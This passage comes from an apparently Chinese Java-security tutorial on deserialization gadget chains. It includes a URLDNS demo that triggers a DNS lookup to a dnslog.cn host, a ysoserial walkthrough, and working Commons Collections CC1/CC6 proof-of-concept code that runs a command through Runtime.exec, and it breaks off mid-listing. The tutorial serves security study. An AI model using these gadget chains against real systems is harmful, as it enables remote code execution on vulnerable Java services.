**/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SerializeDemo</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 创建一个待序列化的对象</span></span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;Alice&quot;</span>, <span class=\"number\">25</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 序列化person对象到.ser文件</span></span><br><span class=\"line\">        serialize(person, <span class=\"string\">&quot;person.bin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 从.ser文件反序列化对象</span></span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">deserializedPerson</span> <span class=\"operator\">=</span> deserialize(<span class=\"string\">&quot;person.bin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 打印反序列化后的对象信息</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Name: &quot;</span> + deserializedPerson.getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Age: &quot;</span> + deserializedPerson.getAge());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 序列化对象到person.bin文件</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object object, String fileName)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (<span class=\"type\">FileOutputStream</span> <span class=\"variable\">fos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(fileName);</span><br><span class=\"line\">             <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">oos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(fos)) &#123;</span><br><span class=\"line\">            oos.writeObject(object);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Object serialized to &quot;</span> + fileName);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 从person.bin文件反序列化对象</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">deserialize</span><span class=\"params\">(String fileName)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (<span class=\"type\">FileInputStream</span> <span class=\"variable\">fis</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(fileName);</span><br><span class=\"line\">             <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(fis)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (Person) ois.readObject();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 定义可序列化的Person类,包含了两个属性，分别是name和age</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"type\">int</span> age;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, <span class=\"type\">int</span> age)</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getAge</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> age;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"r8S4l8zE1urdmknqisX7h32MiZ1PKyFJ7Yd9zK668gk.png\" alt=\"image\"></p>\n<h2 id=\"URLDNS\"><a href=\"#URLDNS\" class=\"headerlink\" title=\"URLDNS\"></a>URLDNS</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">利用链:</span><br><span class=\"line\">HashMap.readObject(ObjectInputStream in)</span><br><span class=\"line\">   HashMap.putVal()</span><br><span class=\"line\">       HashMap -&gt; hash()</span><br><span class=\"line\">       URL -&gt; hashCode()</span><br><span class=\"line\">           URLStreamHandler -&gt; hashCode()</span><br><span class=\"line\">           URLStreamHandler -&gt; getHostAddress()</span><br><span class=\"line\">       URL -&gt; getHostAddress()</span><br><span class=\"line\">           InetAddress -&gt; getByName()</span><br></pre></td></tr></table></figure>\n<p>首先，我们来看一下HashMap，HashMap是实现了Map&lt;K,V&gt;, Cloneable 和 Serializable 接口；意味着实现它的类可以被序列化。</p>\n<p><img src=\"b4ij8_pwMe9XPhqRbWGbewNWGOBEegADet6hUppCe6E.png\" alt=\"image\"></p>\n<p>然后我们来看到HashMap的readObject。这是重写了readObject，主要进行了读取序列化数据、校验参数、创建哈希表等；从而实现可以确保在反序列化后，HashMap 对象正确地包含之前序列化的键值对。这里我们重点看后面的hash(key)</p>\n<p><img src=\"nur94AWOfELaLuQE3Ff-ADQjfzmeS8Ayg2_-_2ICklc.png\" alt=\"image\"></p>\n<p>跟进 hash ()，可以看到，该方法接收一个 key 参数，这里主要实现计算键的哈希值，这个参数可以是任意类型的对象。</p>\n<p><img src=\"eH5rkHYOx1xHiC_7u3yEAOPVi41qiqM6Nel9NUemAbM.png\" alt=\"image\"></p>\n<p>继续跟进去到了hashCode，返回对象的哈希码</p>\n<p><img src=\"geOYynHlT0YgGBth3BbQcbKhkAsoFCCAcKlVt8JjiU4.png\" alt=\"image\"></p>\n<p>在进行Java开发的过程当中会有很多类会直接或间接调用到hashCode()这个方法。我们点一下左边的按钮可以看到我这个版本的jdk里面大约有1175个方法重写了hashCode。当然我们这里可以直接看到URL类也是重写了hashCode。所以只要能够从前面的HashMap的readObject进入到 hash 以及参数可控，那么我们就可以利用了。</p>\n<p><img src=\"iCb6IoAS7nP5u2NtMfku16m_hoTYqLjq_3Z3iU0lads.png\" alt=\"image\"></p>\n<p>下面看一下URL重写的hashcode；声明一个整型变量 hashCode，并初始化为 -1；然后进行条件判断 (hashCode !&#x3D; -1)，判断是否已经计算过哈希码。如果哈希码等于 -1，表示还未计算过哈希码，则调用 handler.hashCode(this) 方法，传入当前对象作为参数，计算对象的哈希码。</p>\n<p><img src=\"rnP1SnwPxGZ-ddRTbdpzK8xMghudb3k_EcHyTSAx0Wc.png\" alt=\"image\"></p>\n<p>我们跟进到handler.hashCode；实现根据url对象的协议、主机、文件、端口和引用等属性，计算出一个唯一的哈希码作为对象的标识。重点看到353行调⽤ getHostAddress ⽅法，这个是生成主机部分的哈希码；继续跟进</p>\n<p><img src=\"PsThq7g9BKyALw6jEu7FOgedBSbLg88i1QJW9yDvL4k.png\" alt=\"image\"></p>\n<p>在getHostAddress方法中，这里实现获取URL 对象的主机地址对应的 InetAddress 对象。如果没有缓存，会进行一次 DNS 解析来获取主机地址，并将结果进行缓存。这样可以减少重复的 DNS 解析开销，提高性能。</p>\n<p><img src=\"-FhaNKM2ZOToe87TRVwolWnpwtE8a8sI2beLhQaWex4.png\" alt=\"image\"></p>\n<p>这时整体的思路就有了，首先是实例化一个 java.net.url对象，然后调用put传入给hashMap对象。然后再传入一个非-1的值作为参数，这样做是为了确保 HashMap 的插入操作不会触发DNS解析。最后将hashCode 字段的值设置为 -1，以使得在执行利用链时能够触发请求，也就是确保能调用执行handler.hashCode函数。</p>\n<p><img src=\"EuBKFy-s9f77V-0J2GKC7O_75qr_NK_8Bhf6ylqnZiM.png\" alt=\"image\"></p>\n<p>最终写出的一个demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.Javasecure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/7/17 11:12 上午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">demo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//实力化一个hashMap对象和一个URL对象</span></span><br><span class=\"line\">        <span class=\"type\">HashMap</span> <span class=\"variable\">hashMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>();</span><br><span class=\"line\">        <span class=\"type\">URL</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(<span class=\"string\">&quot;http://cm1b9l.dnslog.cn&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//这段代码通过反射获取了 url 对象的 hashCode 字段，并将其设置为可访问。</span></span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">hashCodeField</span> <span class=\"operator\">=</span> url.getClass().getDeclaredField(<span class=\"string\">&quot;hashCode&quot;</span>);</span><br><span class=\"line\">        hashCodeField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 避免创建payload时触发请求</span></span><br><span class=\"line\">        hashCodeField.set(url, <span class=\"number\">0</span>);</span><br><span class=\"line\">        hashMap.put(url, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 使利用链执行时能够触发请求</span></span><br><span class=\"line\">        hashCodeField.set(url,-<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//进行反序列化操作，输出为ser.bin文件</span></span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">oos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(<span class=\"string\">&quot;ser.bin&quot;</span>)));</span><br><span class=\"line\">        oos.writeObject(hashMap);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;序列化成功&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//进行反序列化，以触发DNS解析</span></span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">oosin</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        oosin.readObject();</span><br><span class=\"line\">        oosin.close();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;反序列化成功&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>执行之后，最近收到了DNS解析的请求</p>\n<p><img src=\"HmrnyhMcIQ1bLzcTSivhn_32R4ZDJTHc4Utx7382gQw.png\" alt=\"image\"></p>\n<h2 id=\"Ysoserial-URLDNS\"><a href=\"#Ysoserial-URLDNS\" class=\"headerlink\" title=\"Ysoserial.URLDNS\"></a>Ysoserial.URLDNS</h2><p>先是在主类GeneratePayload；获取指定的根据命令行参数获取 payload 的类型和要执行的命令。使用 Utils.getPayloadClass(payloadType) 方法获取与 payload 类型对应的 payload 类</p>\n<p><img src=\"Aqh2cx7izJhK6UWx_xXMwx7MPTLd-3yE6gnAcql688U.png\" alt=\"image\"></p>\n<p>我们来看到URLDNS类；实现了 ObjectPayload 接口的 URLDNS 类，用于生成一个包含指定 URL 的 HashMap 对象作为 payload</p>\n<p><img src=\"P4YoVmv1GIhgr2PHyQaAPvdC0Wp3U6ogx0UvAteXQF4.png\" alt=\"image\"></p>\n<p>然后调用PayloadRunner.run；在PayloadRunner.run可以进行序列化，序列化好的结果则为payload</p>\n<p><img src=\"zSy25BKJKMGCQn_YD6xgkiaeaajw8gdhJPdAa07JemM.png\" alt=\"image\"></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://mp.weixin.qq.com/s/nMkV__cVYarjnTYsNPKMGg\">https://mp.weixin.qq.com/s/nMkV__cVYarjnTYsNPKMGg</a></p>\n<p><a href=\"http://blog.m1kael.cn/index.php/archives/449/\">http://blog.m1kael.cn/index.php/archives/449/</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现"]},{"title":"Java安全之cc6链","url":"/2023/08/07/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc6%E9%93%BE/","content":"<h1 id=\"Java安全之cc6链\"><a href=\"#Java安全之cc6链\" class=\"headerlink\" title=\"Java安全之cc6链\"></a>Java安全之cc6链</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>荒废了一段时间了，是时侯捡起cc链了，我们前面讲了CC1链和URLDNS链。但是CC1链中的AnnotationInvocationHandler会在jdk 8u71版本之后做了更改，所以高版本的时候CC1链就不适用了，此时我们只能寻找其它的调用链，也就是我们这一次要说的CC6.</p>\n<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>\n<h2 id=\"新的cc1\"><a href=\"#新的cc1\" class=\"headerlink\" title=\"新的cc1\"></a>新的cc1</h2><p>我们都知道在CC1链中AnnotationInvocationHandler的readObject方法里面调用到setValue，所以我们需要寻找另外一个能调用到setValue的地方。</p>\n<p>我们在分析CC1的时候是用TransformedMap去调用的transform。现在我们换成LazyMap这个类以另一种形式去实现CC1。</p>\n<p><img src=\"k4Gr4z2GYTJjh-R2YTC1fOXVpxZEAGuZP4qphaLFid4.png\" alt=\"image\"></p>\n<p>在LazyMap类中有一个get方法，其大致的意思是接收一个键（key），并返回与该键关联的值（value）。如果键不存在于映射（map）中，则通过工厂方法（factory.transform(key)）创建相应的值，并将键值对添加到映射中。这里调用了factory.transform。我们再去看哪里调用了LazyMap的get方法。</p>\n<p><img src=\"dwewXVHR3rZTvRtxb8R5cgfxT2FJL8LfQLtBCiUisgw.png\" alt=\"image\"></p>\n<p>那么下一步就去找哪里调用了这个get，太难找了，我们直接就去分析前人总结的AnnotationInvocationHandler类吧。我们发现在sun.reflect.annotation的AnnotationInvocationHandler类中调用了get方法，且是我们可控的</p>\n<p><img src=\"WcXs-NV9BgxEL_T_xJGdWlLlYFv8h9AlYBg4WKRgF8k.png\" alt=\"image\"></p>\n<p>我们往上看，发现是在invoke方法里面的。这个方法是只要外面有动态代理调用方法，就会调用这个invoke方法。</p>\n<p><img src=\"zleySJ5xrQoR1JH5VMSB6CtFjnNWWJnHE7fF1Wxysos.png\" alt=\"image\"></p>\n<p>从代码分析上面看，最好不要满足第一个if，如果是调用了equals，就会直接进行return了。第二个if是如果参数不为零（如果调用的是有参方法），就会进行抛出异常。那么我们就需要在readObject中找到一个是调用无参方法的，正好在该类中就有一个。</p>\n<p><img src=\"LBuWa0NW9L-cq5sg8j7x7q9WkQuJKMlGVE94FdNY_Og.png\" alt=\"image\"></p>\n<p>此时的调用链大致为</p>\n<p><img src=\"MCJEJA-N_cyezSKY69omsTUR7O8kGfyCcx5rZBV3PxE.png\" alt=\"image\"></p>\n<h2 id=\"实现新的cc1\"><a href=\"#实现新的cc1\" class=\"headerlink\" title=\"实现新的cc1\"></a>实现新的cc1</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/8/6 9:39 上午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">cc1New</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>,<span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">    HashMap&lt;Object,Object&gt; map =  <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    Map&lt;Object,Object&gt; lazydMap= LazyMap.decorate(map,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">    Class c=  Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">    Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\">    constructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    <span class=\"type\">InvocationHandler</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazydMap);</span><br><span class=\"line\">    <span class=\"type\">Map</span> <span class=\"variable\">mapProxy</span> <span class=\"operator\">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class=\"line\">    Object obj= constructor.newInstance(Override.class,mapProxy);</span><br><span class=\"line\">    serialize(obj);</span><br><span class=\"line\">    unserialize();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"-YOvvzgUVlIeyIxpT2FOm9WuQnvFYAEMomy0FVkzWuo.png\" alt=\"image\"></p>\n<h2 id=\"cc1修复分析\"><a href=\"#cc1修复分析\" class=\"headerlink\" title=\"cc1修复分析\"></a>cc1修复分析</h2><p>我们看一下在新的版本中是被怎么修复的</p>\n<p>原因：我们发现memberValues的获取方式做了修改</p>\n<p><img src=\"6wmw4nWUA9egT3LOfKen1p7ZAEFu3TR8f3VaDZ4rPOQ.png\" alt=\"image\"></p>\n<p>根本原因：setvalue被移除了</p>\n<p><img src=\"4VpLUQjetovfUGYFoqZSfH3OVJ3GFZgRqTNFhzITWMc.png\" alt=\"image\"></p>\n<h2 id=\"CC6分析\"><a href=\"#CC6分析\" class=\"headerlink\" title=\"CC6分析\"></a>CC6分析</h2><p>我们分析了cc1的修复，发现从AnnotationInvocationHandler类中去实现cc1已经不可能了，两种实现的方式都被修复了。但是TransformedMap类和LazyMap类后面的链还是可以继续使用的。下面我们继续用LazyMap类后半部分来构造新的链，也就是我们下面要说的cc6。</p>\n<p>我们在TiedMapEntry类中发现了getValue方法里面有调用到LazyMap类的get</p>\n<p><img src=\"S1K0bKO3xHHbfgrKzC57uc8iSbwy_q8rbkRnU065Lw4.png\" alt=\"image\"></p>\n<p>在本类中的hashCode又调用了getValue</p>\n<p><img src=\"KdbDJywZpc8A5t5Tfq2M-3zTT_3aI1YTQTZZwRcK4Nw.png\" alt=\"image\"></p>\n<p>我们都知道在hashmap的里面有调用了hashCode的</p>\n<p><img src=\"7-FptKLxXa4IG9jEqpLWqs8idma6B17Uq3jNezBHPM8.png\" alt=\"image\"></p>\n<p>我们继续跟进去看看哪里调用hashCode；于是就很熟悉了，想起了URLDNS的那条链，在HashMap这个类中的readObject方法中调用了hash，然后hash里面又调用了hashCode</p>\n<p><img src=\"YfmNOLxo3a2upQehCnb8hOchFkEKALwn8M1DnADZTW0.png\" alt=\"image\"></p>\n<p>readObject方法中调用了hash</p>\n<p><img src=\"-w7L1RMP8Y0s9ZHZBcdPQREIEu9IfKMs5Mi2azVsY2Q.png\" alt=\"image\"></p>\n<h2 id=\"构造cc6-poc\"><a href=\"#构造cc6-poc\" class=\"headerlink\" title=\"构造cc6 poc\"></a>构造cc6 poc</h2><p>于是我们就可以结合URLDNS那条链来进行构造cc6；前面的执行命令和使用LazyMap都是和上述讲的cc1是一样的，我们从TiedMapEntry开始。</p>\n<p>实例化一个TiedMapEntry，我们看一下构造函数，需要传入一个mao和一个key</p>\n<p><img src=\"_WHQOveCBnsrUb21oxHfRYGEculKq1KINmdbTZqkoxs.png\" alt=\"image\"></p>\n<p>我们就写成这样，传入一个map,然后key就随便写了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">TiedMapEntry</span> <span class=\"variable\">tiedMapEntry</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TiedMapEntry</span>(decorate, <span class=\"string\">&quot;qwe&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>然后再实例化一个hashmap把当作key放进去，因为hashmap的readObject方法是对key进行hash的，然后value随意</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">HashMap&lt;Object, Object&gt; objcc6 = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">objcc6.put(tiedMapEntry,<span class=\"string\">&quot;asd&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>写到这里，直接进行序列化的阶段就会直接触发了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> 